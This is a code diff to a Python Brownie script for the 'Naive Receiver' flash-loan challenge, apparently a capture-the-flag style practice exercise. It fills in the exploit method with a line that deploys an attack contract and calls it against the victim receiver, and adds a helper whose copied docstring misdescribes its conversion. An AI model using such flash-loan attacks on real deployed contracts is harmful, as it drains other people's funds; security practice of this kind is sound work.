@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-from brownie import  FlashLoanReceiver, NaiveReceiverLenderPool as LenderPool, accounts
+from brownie import  FlashLoanReceiver, NaiveReceiverLenderPool as LenderPool, AttackFlashLoanReceiver,  accounts
 
 def main():
     NaiveReceiver().main()
@@ -45,6 +45,7 @@ class NaiveReceiver():
     def exploit(self):
         """WRITE EXPLOIT HERE"""
         print("RUNNING EXPLOIT...")
+        AttackFlashLoanReceiver.deploy(self.pool.address, {"from": self.some_user}).attackReceiver(self.receiver.address)
         return
 
     def exploit_outcome_1(self):
@@ -79,3 +80,7 @@ class NaiveReceiver():
     def ether(self, amount):
         """receives number and converts to wei"""
         return amount*10**18
+
+    def readable_ether(self, amount):
+        """receives number and converts to wei"""
+        return amount/10**18
